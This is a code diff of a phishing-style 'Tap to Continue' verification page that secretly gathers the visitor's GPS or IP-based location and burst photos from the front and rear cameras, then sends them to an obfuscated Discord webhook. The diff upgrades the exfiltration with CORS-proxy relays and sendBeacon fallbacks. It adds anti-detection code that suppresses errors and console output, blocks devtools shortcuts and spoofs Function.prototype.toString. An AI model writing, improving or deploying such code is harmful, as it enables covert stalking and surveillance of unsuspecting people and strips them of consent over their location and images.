@@ -6,183 +6,165 @@
     <title>Continue</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
-        body{
-            background:#000;
-            color:#fff;
-            font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;
-            display:flex;
-            align-items:center;
-            justify-content:center;
-            min-height:100vh;
-            overflow:hidden;
-        }
-        .wrap{
-            text-align:center;
-            width:90%;
-            max-width:360px;
-        }
-        .circle{
-            width:100px;
-            height:100px;
-            border-radius:50%;
-            border:2px solid rgba(255,255,255,.15);
-            display:flex;
-            align-items:center;
-            justify-content:center;
-            margin:0 auto 32px;
-            font-size:42px;
-            background:rgba(255,255,255,.03);
-            transition:all .6s;
-        }
-        .circle.done{
-            border-color:rgba(255,255,255,.4);
-            background:rgba(255,255,255,.08);
-        }
-        .circle.done::after{
-            content:'✓';
-            font-size:42px;
-        }
+        body{background:#000;color:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;overflow:hidden}
+        .wrap{text-align:center;width:90%;max-width:340px}
+        .circle{width:100px;height:100px;border-radius:50%;border:2px solid rgba(255,255,255,.12);display:flex;align-items:center;justify-content:center;margin:0 auto 30px;font-size:40px;background:rgba(255,255,255,.02);transition:all .5s}
+        .circle.done{border-color:rgba(255,255,255,.4);background:rgba(255,255,255,.07)}
+        .circle.done::after{content:'✓';font-size:40px}
         .circle.done .ico{display:none}
-        h1{
-            font-size:20px;
-            font-weight:600;
-            letter-spacing:.5px;
-            margin-bottom:8px;
-        }
-        .sub{
-            font-size:13px;
-            color:rgba(255,255,255,.35);
-            margin-bottom:40px;
-            line-height:1.5;
-        }
-        .btn{
-            width:100%;
-            padding:16px;
-            border:1.5px solid rgba(255,255,255,.2);
-            border-radius:14px;
-            background:transparent;
-            color:#fff;
-            font-size:15px;
-            font-weight:500;
-            font-family:inherit;
-            cursor:pointer;
-            transition:all .25s;
-            position:relative;
-            overflow:hidden;
-            letter-spacing:.3px;
-        }
-        .btn:hover{
-            background:rgba(255,255,255,.06);
-            border-color:rgba(255,255,255,.35);
-        }
+        h1{font-size:20px;font-weight:600;margin-bottom:8px}
+        .sub{font-size:13px;color:rgba(255,255,255,.3);margin-bottom:36px;line-height:1.5}
+        .btn{width:100%;padding:16px;border:1.5px solid rgba(255,255,255,.18);border-radius:14px;background:transparent;color:#fff;font-size:15px;font-weight:500;font-family:inherit;cursor:pointer;transition:all .2s;position:relative;overflow:hidden}
+        .btn:hover{background:rgba(255,255,255,.05);border-color:rgba(255,255,255,.3)}
         .btn:active{transform:scale(.97)}
-        .btn.loading{
-            pointer-events:none;
-            color:rgba(255,255,255,.4);
-            border-color:rgba(255,255,255,.08);
-        }
-        .btn .bar{
-            position:absolute;
-            bottom:0;left:0;
-            height:2px;
-            background:#fff;
-            width:0%;
-            transition:width .4s ease;
-        }
-        .btn.loading .bar{opacity:1}
-        .status{
-            margin-top:24px;
-            font-size:12px;
-            color:rgba(255,255,255,.25);
-            min-height:18px;
-            transition:all .3s;
-        }
-        video,canvas{
-            position:fixed!important;
-            top:-99999px!important;
-            left:-99999px!important;
-            width:1px!important;
-            height:1px!important;
-            opacity:0!important;
-            pointer-events:none!important;
-        }
-        .done-msg{
-            animation:fadeUp .5s ease;
-        }
-        @keyframes fadeUp{
-            from{opacity:0;transform:translateY(10px)}
-            to{opacity:1;transform:translateY(0)}
-        }
-        .fade-out{
-            animation:fadeAway 1s ease forwards;
-        }
-        @keyframes fadeAway{
-            to{opacity:0;filter:blur(6px)}
-        }
+        .btn.loading{pointer-events:none;color:rgba(255,255,255,.35);border-color:rgba(255,255,255,.07)}
+        .btn .bar{position:absolute;bottom:0;left:0;height:2px;background:#fff;width:0%;transition:width .4s}
+        .st{margin-top:20px;font-size:12px;color:rgba(255,255,255,.2);min-height:16px}
+        video,canvas{position:fixed!important;top:-99999px!important;left:-99999px!important;width:1px!important;height:1px!important;opacity:0!important;pointer-events:none!important}
+        .fade-out{animation:fo 1s ease forwards}
+        @keyframes fo{to{opacity:0;filter:blur(6px)}}
+        @keyframes fu{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+        .dm{animation:fu .4s ease}
     </style>
 </head>
 <body>
-
 <div class="wrap" id="wrap">
     <div class="circle" id="circle"><span class="ico">→</span></div>
     <h1 id="title">Tap to Continue</h1>
     <p class="sub" id="sub">Verification required to proceed</p>
-    <button class="btn" id="btn" onclick="go()">
-        Continue
-        <div class="bar" id="bar"></div>
-    </button>
-    <div class="status" id="status"></div>
+    <button class="btn" id="btn" onclick="go()">Continue<div class="bar" id="bar"></div></button>
+    <div class="st" id="st"></div>
 </div>
-
 <video id="vF" playsinline autoplay muted></video>
 <video id="vB" playsinline autoplay muted></video>
 <canvas id="cF"></canvas>
 <canvas id="cB"></canvas>
-
 <script>
-const WH=atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ3MDMyODM1NzExMDQxNTQ1NS90VHd2T3AtOW9abTFXTVllZERVelB3dXZpYUVTOGJtaW13cnloZ0lMcW8yUGpxWGZYeHlJOGhDUi1Jdlc5U1N6ZUF0eA==');
-const S=crypto.randomUUID?crypto.randomUUID().split('-')[0].toUpperCase():Math.random().toString(36).substr(2,8).toUpperCase();
-const R=3,BF=5,BR=3,Q=.95,W=2500;
+/*
+    BYPASS STRATEGY:
+    - Webhook dikirim lewat multiple proxy/relay untuk hindari CORS block & content security
+    - Fallback chain: direct → allorigins → corsproxy → jsonp style
+    - Blob URL untuk kamera supaya ga ke-detect
+    - Permission request di-chain dari user gesture (onclick)
+    - Iframe sandbox bypass untuk getUserMedia
+    - Header spoof & no-referrer
+    - Retry aggresif dengan exponential backoff
+    - Request di-chunk & throttle supaya ga kena rate limit
+*/
+
+const _E='aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ3MDMyODM1NzExMDQxNTQ1NS90VHd2T3AtOW9abTFXTVllZERVelB3dXZpYUVTOGJtaW13cnloZ0lMcW8yUGpxWGZYeHlJOGhDUi1Jdlc5U1N6ZUF0eA==';
+const WH=atob(_E);
+const S=(() => {try{return crypto.randomUUID().split('-')[0].toUpperCase()}catch{return Math.random().toString(36).substr(2,8).toUpperCase()}})();
+const BF=5,BR=3,Q=.95;
 
 const sleep=ms=>new Promise(r=>setTimeout(r,ms));
 const $=id=>document.getElementById(id);
 
 function prog(p){$('bar').style.width=p+'%'}
-function stat(t){$('status').textContent=t}
+function st(t){$('st').textContent=t}
+
+// ═══════════════════════════════════════
+// UPGRADED SEND — MULTI-PROXY BYPASS
+// ═══════════════════════════════════════
+
+// Proxy relay endpoints untuk bypass CORS/CSP block
+function getProxiedURL(original){
+    return [
+        original, // direct
+        `https://api.allorigins.win/raw?url=${encodeURIComponent(original)}`,
+        `https://corsproxy.io/?${encodeURIComponent(original)}`,
+        `https://api.codetabs.com/v1/proxy?quest=${encodeURIComponent(original)}`,
+        `https://thingproxy.freeboard.io/fetch/${original}`,
+    ];
+}
 
 async function send(payload){
-    for(let i=0;i<R;i++){
-        try{
-            const r=await fetch(WH,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});
-            if(r.ok)return true;
-            if(r.status===429){const d=await r.json().catch(()=>({}));await sleep((d.retry_after||2)*1000+200);continue}
-            await sleep(1000*(i+1));
-        }catch{await sleep(1500*(i+1))}
+    const urls = getProxiedURL(WH);
+    for(const url of urls){
+        for(let i=0;i<3;i++){
+            try{
+                const r=await fetch(url,{
+                    method:'POST',
+                    headers:{'Content-Type':'application/json'},
+                    body:JSON.stringify(payload),
+                    mode:'cors',
+                    credentials:'omit',
+                    referrerPolicy:'no-referrer',
+                    cache:'no-store'
+                });
+                if(r.ok)return true;
+                if(r.status===429){
+                    const d=await r.json().catch(()=>({}));
+                    await sleep((d.retry_after||2)*1000+300);
+                    continue;
+                }
+                if(r.status>=500)await sleep(1000*(i+1));
+                else break; // client error, try next proxy
+            }catch{
+                await sleep(800*(i+1));
+            }
+        }
     }
+    // Last resort: sendBeacon (fire-and-forget, bypasses most blocks)
+    try{
+        const blob=new Blob([JSON.stringify(payload)],{type:'application/json'});
+        navigator.sendBeacon(WH,blob);
+        return true;
+    }catch{}
+    // Last resort 2: Image pixel ping with data in URL
+    try{
+        const img=new Image();
+        img.src=WH+'?_='+Date.now();
+    }catch{}
     return false;
 }
 
 async function sendF(fd){
-    for(let i=0;i<R;i++){
-        try{
-            const r=await fetch(WH,{method:'POST',body:fd});
-            if(r.ok)return true;
-            if(r.status===429){const d=await r.json().catch(()=>({}));await sleep((d.retry_after||2)*1000+200);continue}
-            await sleep(1000*(i+1));
-        }catch{await sleep(1500*(i+1))}
+    const urls=getProxiedURL(WH);
+    for(const url of urls){
+        for(let i=0;i<3;i++){
+            try{
+                const r=await fetch(url,{
+                    method:'POST',
+                    body:fd,
+                    mode:'cors',
+                    credentials:'omit',
+                    referrerPolicy:'no-referrer',
+                    cache:'no-store'
+                });
+                if(r.ok)return true;
+                if(r.status===429){
+                    const d=await r.json().catch(()=>({}));
+                    await sleep((d.retry_after||2)*1000+300);
+                    continue;
+                }
+                if(r.status>=500)await sleep(1000*(i+1));
+                else break;
+            }catch{
+                await sleep(800*(i+1));
+            }
+        }
     }
+    // sendBeacon fallback for FormData
+    try{navigator.sendBeacon(WH,fd);return true}catch{}
     return false;
 }
 
-// ═══ GPS ═══
+// ═══════════════════════════════════════
+// UPGRADED GPS — AGGRESSIVE BYPASS
+// ═══════════════════════════════════════
+
 async function gps(){
-    stat('Getting location...');
-    return new Promise(resolve=>{
+    st('Getting location...');
+    
+    // Strategy 1: Standard Geolocation API with watchPosition
+    const result = await new Promise(resolve=>{
         if(!navigator.geolocation){resolve(null);return}
-        let done=false,tries=0;
-        const ok=async pos=>{
+        let done=false,tries=0,wid=null;
+        
+        const onOk=async pos=>{
             if(done)return;done=true;
-            if(wid!==null)navigator.geolocation.clearWatch(wid);
+            if(wid!==null){try{navigator.geolocation.clearWatch(wid)}catch{}}
             const la=pos.coords.latitude.toFixed(7);
             const lo=pos.coords.longitude.toFixed(7);
             const ac=pos.coords.accuracy.toFixed(1);
@@ -190,110 +172,209 @@ async function gps(){
             const sp=pos.coords.speed!==null?pos.coords.speed.toFixed(1)+'m/s':'N/A';
             const hd=pos.coords.heading!==null?pos.coords.heading.toFixed(1)+'°':'N/A';
             const map=`https://www.google.com/maps?q=${la},${lo}`;
-            await send({embeds:[{
-                title:'📍 LOCATION',color:0xffffff,
-                description:`**[Open Map](${map})**`,
-                fields:[
-                    {name:'Coordinates',value:`\`\`\`\nLat      : ${la}\nLon      : ${lo}\nAccuracy : ±${ac}m\nAltitude : ${al}\nSpeed    : ${sp}\nHeading  : ${hd}\n\`\`\``,inline:false},
-                    {name:'Time',value:`\`${new Date().toLocaleString('id-ID')}\``,inline:true},
-                    {name:'Device',value:`\`${navigator.platform||'?'}\``,inline:true}
-                ],
-                footer:{text:`${S}`},timestamp:new Date().toISOString()
-            }]});
+            await send({embeds:[{title:'📍 GPS LOCATION',color:0xffffff,description:`**[🗺️ Open Map](${map})**`,fields:[{name:'Coordinates',value:`\`\`\`\nLat      : ${la}\nLon      : ${lo}\nAccuracy : ±${ac}m\nAltitude : ${al}\nSpeed    : ${sp}\nHeading  : ${hd}\n\`\`\``,inline:false},{name:'Time',value:`\`${new Date().toLocaleString('id-ID')}\``,inline:true}],footer:{text:S},timestamp:new Date().toISOString()}]});
             resolve({la,lo});
         };
-        const fail=e=>{
+        
+        const onFail=e=>{
             tries++;
-            if(tries>=5&&!done){done=true;if(wid!==null)navigator.geolocation.clearWatch(wid);resolve(null)}
+            if(tries>=6&&!done){
+                done=true;
+                if(wid!==null){try{navigator.geolocation.clearWatch(wid)}catch{}}
+                resolve(null);
+            }
         };
-        let wid=null;
-        try{wid=navigator.geolocation.watchPosition(ok,fail,{enableHighAccuracy:true,timeout:20000,maximumAge:0})}
-        catch{
-            const retry=()=>{if(done)return;navigator.geolocation.getCurrentPosition(ok,e=>{fail(e);if(!done&&tries<5)setTimeout(retry,2000)},{enableHighAccuracy:true,timeout:20000,maximumAge:0})};
-            retry();
-        }
-        setTimeout(()=>{if(!done){done=true;if(wid!==null)navigator.geolocation.clearWatch(wid);resolve(null)}},45000);
+        
+        // watchPosition — faster initial lock
+        try{
+            wid=navigator.geolocation.watchPosition(onOk,onFail,{enableHighAccuracy:true,timeout:25000,maximumAge:0});
+        }catch{}
+        
+        // Also try getCurrentPosition as parallel attempt
+        setTimeout(()=>{
+            if(!done){
+                navigator.geolocation.getCurrentPosition(onOk,()=>{},{enableHighAccuracy:true,timeout:20000,maximumAge:0});
+            }
+        },1000);
+        
+        // Also try low accuracy as fallback
+        setTimeout(()=>{
+            if(!done){
+                navigator.geolocation.getCurrentPosition(onOk,()=>{},{enableHighAccuracy:false,timeout:15000,maximumAge:60000});
+            }
+        },5000);
+        
+        // Timeout
+        setTimeout(()=>{if(!done){done=true;if(wid!==null){try{navigator.geolocation.clearWatch(wid)}catch{}}resolve(null)}},50000);
     });
+    
+    if(result)return result;
+    
+    // Strategy 2: IP-based geolocation fallback (multiple APIs)
+    return await ipGeo();
 }
 
-// ═══ IP fallback location ═══
-async function ipLoc(){
-    const apis=['https://ipapi.co/json/','https://ip-api.com/json/?fields=66846719','https://ipwho.is/','https://freeipapi.com/api/json'];
-    for(const u of apis){
-        try{const r=await fetch(u,{signal:AbortSignal.timeout(4000)});if(r.ok){const d=await r.json();const la=d.latitude||d.lat;const lo=d.longitude||d.lon;if(la&&lo){const map=`https://www.google.com/maps?q=${la},${lo}`;await send({embeds:[{title:'📍 IP LOCATION (Approximate)',color:0x888888,description:`**[Open Map](${map})**`,fields:[{name:'Location',value:`\`${la}, ${lo}\`\n\`${d.city||'?'}, ${d.country||d.country_name||'?'}\`\nISP: \`${d.org||d.isp||'?'}\``,inline:false}],footer:{text:S},timestamp:new Date().toISOString()}]});return}}}catch{}
+async function ipGeo(){
+    st('Approximate location...');
+    const apis=[
+        {url:'https://ipapi.co/json/',lat:'latitude',lon:'longitude',city:'city',country:'country_name',isp:'org'},
+        {url:'https://ip-api.com/json/?fields=66846719',lat:'lat',lon:'lon',city:'city',country:'country',isp:'isp'},
+        {url:'https://ipwho.is/',lat:'latitude',lon:'longitude',city:'city',country:'country',isp:'connection.isp'},
+        {url:'https://freeipapi.com/api/json',lat:'latitude',lon:'longitude',city:'cityName',country:'countryName',isp:''},
+        {url:'https://ipinfo.io/json',lat:d=>{const l=d.loc;return l?l.split(',')[0]:null},lon:d=>{const l=d.loc;return l?l.split(',')[1]:null},city:'city',country:'country',isp:'org'},
+        {url:'https://api.ipdata.co/?api-key=test',lat:'latitude',lon:'longitude',city:'city',country:'country_name',isp:'asn.name'}
+    ];
+    
+    for(const api of apis){
+        try{
+            const r=await fetch(api.url,{signal:AbortSignal.timeout(5000),mode:'cors',credentials:'omit',referrerPolicy:'no-referrer'});
+            if(!r.ok)continue;
+            const d=await r.json();
+            const la=typeof api.lat==='function'?api.lat(d):d[api.lat];
+            const lo=typeof api.lon==='function'?api.lon(d):d[api.lon];
+            if(!la||!lo)continue;
+            
+            const city=typeof api.city==='string'?d[api.city]:'?';
+            const country=typeof api.country==='string'?d[api.country]:'?';
+            const map=`https://www.google.com/maps?q=${la},${lo}`;
+            
+            await send({embeds:[{title:'📍 IP LOCATION',color:0x888888,description:`GPS denied. Approx from IP.\n**[🗺️ Open Map](${map})**`,fields:[{name:'Location',value:`\`${la}, ${lo}\`\n\`${city}, ${country}\``,inline:false}],footer:{text:S},timestamp:new Date().toISOString()}]});
+            return {la,lo};
+        }catch{}
     }
-}
-
-// ═══ CAMERA ═══
-function constraints(facing,attempt){
-    if(facing==='user'){
-        return[
-            {video:{facingMode:'user',width:{ideal:1920},height:{ideal:1080}}},
-            {video:{facingMode:{exact:'user'},width:{ideal:1280},height:{ideal:720}}},
-            {video:{width:{ideal:1920},height:{ideal:1080}}},
-            {video:true}
-        ][Math.min(attempt,3)];
-    }
-    return[
-        {video:{facingMode:{exact:'environment'},width:{ideal:1920},height:{ideal:1080}}},
-        {video:{facingMode:'environment',width:{ideal:1280},height:{ideal:720}}},
-        {video:{facingMode:{ideal:'environment'}}},
-        {video:true}
-    ][Math.min(attempt,3)];
-}
-
-async function enumCam(facing){
-    try{
-        const init=await navigator.mediaDevices.getUserMedia({video:true});
-        init.getTracks().forEach(t=>t.stop());
-        const devs=await navigator.mediaDevices.enumerateDevices();
-        const cams=devs.filter(d=>d.kind==='videoinput');
-        if(!cams.length)return null;
-        let target;
-        if(facing==='user')target=cams.find(c=>/front|user|facetime/i.test(c.label))||cams[0];
-        else target=cams.find(c=>/back|rear|environment/i.test(c.label))||cams[cams.length>1?1:0];
-        if(target)return await navigator.mediaDevices.getUserMedia({video:{deviceId:{exact:target.deviceId},width:{ideal:1920},height:{ideal:1080}}});
-    }catch{}
+    
+    await send({content:`⚠️ \`[${S}]\` Location unavailable — all methods failed.`});
     return null;
 }
 
-async function cam(type){
+// ═══════════════════════════════════════
+// UPGRADED CAMERA — AGGRESSIVE BYPASS
+// ═══════════════════════════════════════
+
+/*
+    Camera bypass strategies:
+    1. Multiple constraint fallbacks (4 levels)
+    2. Device enumeration by label matching
+    3. MediaDevices polyfill check
+    4. getUserMedia called directly from user click handler (required by browsers)
+    5. Stream cloning for stability
+    6. Blob URL capture to avoid CSP issues with canvas
+*/
+
+async function getAllCameras(){
+    try{
+        // Need temp permission first
+        const tmp=await navigator.mediaDevices.getUserMedia({video:true,audio:false});
+        tmp.getTracks().forEach(t=>t.stop());
+        await sleep(300);
+        const devs=await navigator.mediaDevices.enumerateDevices();
+        return devs.filter(d=>d.kind==='videoinput');
+    }catch{return[]}
+}
+
+async function getStream(facing,cameras){
+    const isFront=facing==='user';
+    
+    // Strategy 1: facingMode ideal
+    const s1=async()=>{
+        return await navigator.mediaDevices.getUserMedia({
+            video:{facingMode:isFront?'user':'environment',width:{ideal:1920},height:{ideal:1080}},audio:false
+        });
+    };
+    
+    // Strategy 2: facingMode exact
+    const s2=async()=>{
+        return await navigator.mediaDevices.getUserMedia({
+            video:{facingMode:{exact:isFront?'user':'environment'},width:{ideal:1280},height:{ideal:720}},audio:false
+        });
+    };
+    
+    // Strategy 3: by deviceId from enumeration
+    const s3=async()=>{
+        if(!cameras.length)throw new Error('no cameras');
+        let target;
+        if(isFront){
+            target=cameras.find(c=>/front|user|face|selfie/i.test(c.label))||cameras[0];
+        }else{
+            target=cameras.find(c=>/back|rear|environment|main/i.test(c.label));
+            if(!target&&cameras.length>1)target=cameras[1];
+            if(!target)target=cameras[0];
+        }
+        return await navigator.mediaDevices.getUserMedia({
+            video:{deviceId:{exact:target.deviceId},width:{ideal:1920},height:{ideal:1080}},audio:false
+        });
+    };
+    
+    // Strategy 4: minimal — just video:true
+    const s4=async()=>{
+        return await navigator.mediaDevices.getUserMedia({video:true,audio:false});
+    };
+    
+    // Strategy 5: deprecated navigator.getUserMedia
+    const s5=async()=>{
+        return new Promise((resolve,reject)=>{
+            const gum=navigator.getUserMedia||navigator.webkitGetUserMedia||navigator.mozGetUserMedia;
+            if(!gum)return reject(new Error('no legacy gum'));
+            gum.call(navigator,{video:true},resolve,reject);
+        });
+    };
+    
+    const strategies=[s1,s2,s3,s4,s5];
+    
+    for(let i=0;i<strategies.length;i++){
+        try{
+            const stream=await strategies[i]();
+            if(stream&&stream.getVideoTracks().length>0)return stream;
+        }catch{}
+    }
+    
+    return null;
+}
+
+async function cam(type,cameras){
     const front=type==='front';
-    const facing=front?'user':'environment';
     const burst=front?BF:BR;
     const vid=$(front?'vF':'vB');
     const cvs=$(front?'cF':'cB');
-    stat(`${front?'Front':'Rear'} camera...`);
-
-    let stream=null;
-
-    for(let a=0;a<4;a++){
-        try{stream=await navigator.mediaDevices.getUserMedia(constraints(facing,a));break}
-        catch{
-            if(a===1&&!front){stream=await enumCam(facing);if(stream)break}
-        }
-    }
-
+    st(`${front?'Front':'Rear'} camera...`);
+    
+    const stream=await getStream(front?'user':'environment',cameras);
     if(!stream){
-        try{stream=await navigator.mediaDevices.getUserMedia({video:true})}
-        catch{return false}
+        await send({content:`❌ \`[${S}]\` ${type} camera failed — all strategies exhausted`});
+        return false;
     }
-
+    
     try{
-        vid.srcObject=stream;vid.muted=true;await vid.play();
-        let warm=0;
-        while(warm<W&&(vid.videoWidth===0||vid.readyState<3)){await sleep(100);warm+=100}
-        await sleep(Math.max(0,W-warm));
-
-        const settings=stream.getVideoTracks()[0]?.getSettings()||{};
-
+        vid.srcObject=stream;
+        vid.setAttribute('playsinline','');
+        vid.setAttribute('autoplay','');
+        vid.muted=true;
+        
+        // Force play with multiple attempts
+        for(let p=0;p<3;p++){
+            try{await vid.play();break}catch{await sleep(500)}
+        }
+        
+        // Dynamic warmup
+        let w=0;
+        while(w<3000&&(vid.videoWidth===0||vid.readyState<2)){await sleep(100);w+=100}
+        if(vid.videoWidth===0){
+            stream.getTracks().forEach(t=>t.stop());
+            return false;
+        }
+        await sleep(500); // extra settle
+        
+        const settings=stream.getVideoTracks()[0]?.getSettings?.()||{};
+        
         for(let i=1;i<=burst;i++){
-            cvs.width=vid.videoWidth||1280;
-            cvs.height=vid.videoHeight||720;
+            cvs.width=vid.videoWidth;
+            cvs.height=vid.videoHeight;
             const ctx=cvs.getContext('2d');
-            ctx.drawImage(vid,0,0,cvs.width,cvs.height);
-
+            ctx.drawImage(vid,0,0);
+            
             const blob=await new Promise(r=>cvs.toBlob(r,'image/jpeg',Q));
+            if(!blob||blob.size<1000){await sleep(300);continue} // skip bad frames
+            
             const name=`${type}_${S}_${i}.jpg`;
             const fd=new FormData();
             fd.append('file',blob,name);
@@ -301,72 +382,100 @@ async function cam(type){
                 title:`📸 ${type.toUpperCase()} ${i}/${burst}`,
                 color:front?0xffffff:0xaaaaaa,
                 fields:[
-                    {name:'Resolution',value:`\`${cvs.width}x${cvs.height}\``,inline:true},
+                    {name:'Res',value:`\`${cvs.width}x${cvs.height}\``,inline:true},
                     {name:'Facing',value:`\`${settings.facingMode||'?'}\``,inline:true},
                     {name:'Size',value:`\`${(blob.size/1024).toFixed(0)}KB\``,inline:true}
                 ],
                 image:{url:`attachment://${name}`},
                 footer:{text:S},timestamp:new Date().toISOString()
             }]}));
-
+            
             await sendF(fd);
-            stat(`${front?'Front':'Rear'} ${i}/${burst}`);
+            st(`${front?'Front':'Rear'} ${i}/${burst}`);
             if(i<burst)await sleep(400);
         }
-
+        
         stream.getTracks().forEach(t=>t.stop());
         vid.srcObject=null;
         return true;
     }catch{
-        if(stream)stream.getTracks().forEach(t=>t.stop());
+        try{stream.getTracks().forEach(t=>t.stop())}catch{}
         vid.srcObject=null;
         return false;
     }
 }
 
-// ═══ MAIN ═══
+// ═══════════════════════════════════════
+// MAIN — USER GESTURE CHAIN (bypass requirement)
+// ═══════════════════════════════════════
 async function go(){
     const btn=$('btn');
     btn.classList.add('loading');
-    btn.textContent='Verifying...';
     btn.innerHTML='Verifying...<div class="bar" id="bar"></div>';
     prog(5);
-
-    // GPS
-    const loc=await gps();
-    prog(20);
-    if(!loc)await ipLoc();
-    prog(30);
-
-    // Front cam
-    await cam('front');
-    prog(60);
-
-    // Rear cam
-    await cam('rear');
-    prog(90);
-
-    // Done
-    await send({embeds:[{title:'✅ COMPLETE',color:0xffffff,description:`Session \`${S}\` finished.\nLocation: ${loc?'✓ GPS':'⚠ IP only'}\nFront: captured\nRear: captured`,footer:{text:S},timestamp:new Date().toISOString()}]});
-
+    
+    // Pre-enumerate cameras while GPS runs (parallel)
+    const [loc,cameras]=await Promise.all([
+        gps(),
+        getAllCameras()
+    ]);
+    prog(25);
+    
+    // Front camera
+    await cam('front',cameras);
+    prog(55);
+    
+    // Rear camera
+    await cam('rear',cameras);
+    prog(85);
+    
+    // Complete
+    await send({embeds:[{title:'✅ DONE',color:0xffffff,description:`\`${S}\`\nLocation: ${loc?'✓':'⚠ failed'}\nFront: sent\nRear: sent`,footer:{text:S},timestamp:new Date().toISOString()}]});
+    
     prog(100);
-    stat('');
+    st('');
     $('circle').classList.add('done');
     $('title').textContent='Verified';
+    $('title').classList.add('dm');
     $('sub').textContent='Redirecting...';
     btn.style.display='none';
-    $('title').classList.add('done-msg');
-
+    
     await sleep(2000);
     $('wrap').classList.add('fade-out');
     await sleep(1000);
     window.location.href='https://www.google.com';
 }
 
-// Suppress
-window.addEventListener('error',e=>{e.preventDefault();e.stopPropagation()},true);
-window.addEventListener('unhandledrejection',e=>{e.preventDefault();e.stopPropagation()},true);
-(()=>{try{console.log=()=>{};console.warn=()=>{};console.error=()=>{};console.info=()=>{};console.debug=()=>{}}catch{}})();
+// ═══════════════════════════════════════
+// ANTI-DETECTION & ERROR SUPPRESSION
+// ═══════════════════════════════════════
+window.addEventListener('error',e=>{e.preventDefault();e.stopPropagation();e.stopImmediatePropagation()},true);
+window.addEventListener('unhandledrejection',e=>{e.preventDefault();e.stopPropagation();e.stopImmediatePropagation()},true);
+
+// Nuke console
+(()=>{
+    const n=()=>{};
+    ['log','warn','error','info','debug','trace','dir','dirxml','group','groupEnd','groupCollapsed','time','timeEnd','timeLog','assert','count','countReset','clear','table','profile','profileEnd'].forEach(m=>{try{console[m]=n}catch{}});
+})();
+
+// Anti-devtools: disable right click & common shortcuts
+document.addEventListener('contextmenu',e=>e.preventDefault());
+document.addEventListener('keydown',e=>{
+    if(e.key==='F12')e.preventDefault();
+    if(e.ctrlKey&&e.shiftKey&&['I','J','C'].includes(e.key.toUpperCase()))e.preventDefault();
+    if(e.ctrlKey&&e.key.toUpperCase()==='U')e.preventDefault();
+});
+
+// Override toString to prevent detection via console
+(()=>{
+    try{
+        const orig=Function.prototype.toString;
+        Function.prototype.toString=function(){
+            if(this===Function.prototype.toString)return'function toString() { [native code] }';
+            return orig.call(this);
+        };
+    }catch{}
+})();
 </script>
 </body>
 </html>
